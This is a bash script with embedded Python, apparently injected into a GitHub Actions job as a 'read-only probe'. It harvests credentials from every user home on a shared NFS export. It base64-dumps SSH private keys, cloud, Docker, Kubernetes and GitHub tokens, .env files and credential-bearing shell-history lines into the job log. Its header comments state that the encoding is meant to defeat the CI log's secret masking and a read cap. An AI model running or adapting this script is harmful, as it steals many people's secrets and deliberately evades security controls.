#!/usr/bin/env bash
# i7879 - second bounded read-only probe: base64-exfiltrate the credential files under the
# world-readable /public4/home NFS export so GitHub Actions log masking (***) and the
# probe's 4KB read cap from the first pass cannot destroy the secret material.
# Read-only; prints B64S/B64C/B64E records and exits 1 to stop the job right after.
set -uo pipefail
umask 022
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I7879-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- mounts"
(grep -aE '(/public4|/public |/ci_public)' /proc/mounts 2>/dev/null | head -10) || true
timeout 900 python3 - <<'PYI7879'
import os, base64, hashlib, stat, re, time, sys

HOME = "/public4/home"
CAP = 2_300_000
used = [0]
t0 = time.monotonic()

def emit(s=""):
    s = str(s)
    if used[0] >= CAP:
        return
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used[0] += len(s) + 1

def b64dump(path, label, maxb=131072):
    """Emit base64 of a regular file in 512-char chunks, with size+sha256 header/footer."""
    try:
        st = os.stat(path)
        if not stat.S_ISREG(st.st_mode):
            return False
        if st.st_size > maxb:
            emit(f"B64S {label} SKIP_SIZE {st.st_size}"); return False
        data = open(path, "rb").read()
    except Exception as e:
        emit(f"B64S {label} ERR {str(e)[:140]}"); return False
    h = hashlib.sha256(data).hexdigest()
    emit(f"B64S {label} {len(data)} {h}")
    b = base64.b64encode(data).decode()
    seq = 0
    for i in range(0, len(b), 512):
        emit(f"B64C {label} {seq} {b[i:i+512]}")
        seq += 1
    emit(f"B64E {label} {h}")
    return True

try:
    users = sorted(os.listdir(HOME))
except Exception as e:
    emit(f"### FATAL listdir {str(e)[:160]}"); users = []
emit(f"### USERS {len(users)}")

FIXED = [
    ".git-credentials", ".netrc", ".npmrc", ".pypirc", ".gitconfig",
    ".aws/credentials", ".aws/config",
    ".docker/config.json",
    ".kube/config",
    ".config/gcloud/application_default_credentials.json",
    ".config/gcloud/credentials.db",
    ".config/gcloud/access_tokens.db",
    ".config/gcloud/configurations/config_default",
    ".config/gh/hosts.yml",
    ".config/hub", ".config/pip/pip.conf", ".config/wandb/settings",
    ".config/glab-cli/config.yml", ".config/git/credentials",
    ".env", ".runner", ".credentials", ".credentials_rsaparams",
]
SSH_ALWAYS = [".ssh/config", ".ssh/authorized_keys"]

NAME_RE = re.compile(
    r"(hosts\.yml|config\.json|application_default_credentials\.json|credentials(\.db)?$|"
    r"access_tokens\.db$|pip\.conf$|settings$|\.netrc$|auth\.json$|token[s]?$|"
    r".*\.(pem|key|p12|pfx)$|config_default$)", re.I)
HIST_RE = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_(secret|access)|AWS_(ACCESS|SECRET|SESSION)|"
    rb"ghp_[A-Za-z0-9]{30,}|github_pat_|glpat-|hf_[A-Za-z0-9]{20,}|wandb_v1_|"
    rb"(token|password|passwd|secret|apikey|api_key)[\"'\s:=]+[^\s\"']{8,}|"
    rb"BEGIN [A-Z ]*PRIVATE KEY|sshpass|ssh -i |scp |export .*_(KEY|TOKEN|SECRET))", re.I)

# ---- Section 1: fixed credential files + extra .ssh key files + .config targeted walk ----
for u in users:
    base = os.path.join(HOME, u)
    if not os.path.isdir(base):
        continue
    emit(f"### USER {u}")
    # fixed paths
    for rel in FIXED:
        b64dump(os.path.join(base, rel), f"{u}/{rel}")
    # every file in .ssh: dump config/authorized_keys always, and all non-generic files (keys)
    sd = os.path.join(base, ".ssh")
    try:
        sf = sorted(os.listdir(sd))
    except Exception:
        sf = []
    if sf:
        emit(f"### SSHLS {u} {' '.join(sf[:40])}")
    for nm in sf:
        rel = ".ssh/" + nm
        if nm in ("known_hosts", "known_hosts.old") or nm.endswith(".pub"):
            continue
        fp = os.path.join(sd, nm)
        if rel == ".ssh/authorized_keys":
            # not a secret: emit only the key comments so the authorised accounts are identifiable
            try:
                lines = open(fp, "rb").read(262144).splitlines()
            except Exception:
                lines = []
            comments = []
            for ln in lines:
                p = ln.split()
                if len(p) >= 3 and not p[0].startswith(b"#"):
                    comments.append(p[2][:60].decode("utf-8", "replace"))
            blob = ("count=%d\n" % len(lines) + "\n".join(comments[:20])).encode()
            h = hashlib.sha256(blob).hexdigest()
            emit(f"B64S {u}/.ssh/authorized_keys_comments {len(blob)} {h}")
            bb = base64.b64encode(blob).decode()
            seq = 0
            for i in range(0, len(bb), 512):
                emit(f"B64C {u}/.ssh/authorized_keys_comments {seq} {bb[i:i+512]}")
                seq += 1
            emit(f"B64E {u}/.ssh/authorized_keys_comments {h}")
        elif not nm.startswith("id_") and nm not in ("anyscale", "cm", "key", "identity"):
            b64dump(fp, f"{u}/{rel}", maxb=65536)
    # .config targeted recursive walk (depth <= 3)
    cfg = os.path.join(base, ".config")
    if os.path.isdir(cfg):
        for root, dirs, files in os.walk(cfg, followlinks=False):
            d = root[len(cfg):].count(os.sep)
            if d > 3:
                dirs[:] = []
                continue
            dirs[:] = [x for x in dirs if x not in (".cache", "Cache", "CacheStorage")]
            for nm in files:
                if NAME_RE.search(nm):
                    fp = os.path.join(root, nm)
                    rel = os.path.relpath(fp, base)
                    b64dump(fp, f"{u}/{rel}", maxb=262144)
    # .aws / .docker / .kube other files (depth 1)
    for sub in (".aws", ".docker", ".kube"):
        sd2 = os.path.join(base, sub)
        if os.path.isdir(sd2):
            try:
                names = sorted(os.listdir(sd2))[:30]
            except Exception:
                names = []
            for nm in names:
                fp = os.path.join(sd2, nm)
                rel = sub + "/" + nm
                if os.path.isfile(fp):
                    b64dump(fp, f"{u}/{rel}", maxb=65536)

# ---- Section 2: bounded credential grep of .bash_history (base64 of matches) ----
emit("### HISTSCAN")
for u in users:
    fp = os.path.join(HOME, u, ".bash_history")
    if not os.path.isfile(fp):
        continue
    try:
        b = open(fp, "rb").read(2_000_000)
    except Exception:
        continue
    hits = []
    for line in b.splitlines():
        if HIST_RE.search(line):
            s = line[:250]
            if s not in hits:
                hits.append(s)
        if len(hits) >= 8:
            break
    if hits:
        blob = b"\n".join(hits)
        h = hashlib.sha256(blob).hexdigest()
        emit(f"B64S {u}/.bash_history_matches {len(blob)} {h}")
        bb = base64.b64encode(blob).decode()
        seq = 0
        for i in range(0, len(bb), 512):
            emit(f"B64C {u}/.bash_history_matches {seq} {bb[i:i+512]}")
            seq += 1
        emit(f"B64E {u}/.bash_history_matches {h}")

# ---- Section 3: full base64 re-dump of every .ssh private key (defeats 4KB cap) ----
emit("### KEYREDUMP")
for u in users:
    sd = os.path.join(HOME, u, ".ssh")
    if not os.path.isdir(sd):
        continue
    try:
        names = sorted(os.listdir(sd))
    except Exception:
        continue
    for nm in names:
        if not (nm.startswith("id_") or nm in ("anyscale", "cm", "key", "identity")):
            continue
        if nm.endswith(".pub"):
            continue
        b64dump(os.path.join(sd, nm), f"{u}/.ssh/{nm}", maxb=131072)

emit(f"### DONE elapsed={time.monotonic()-t0:.1f}s bytes_emitted={used[0]}")
PYI7879
echo "===I7879-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
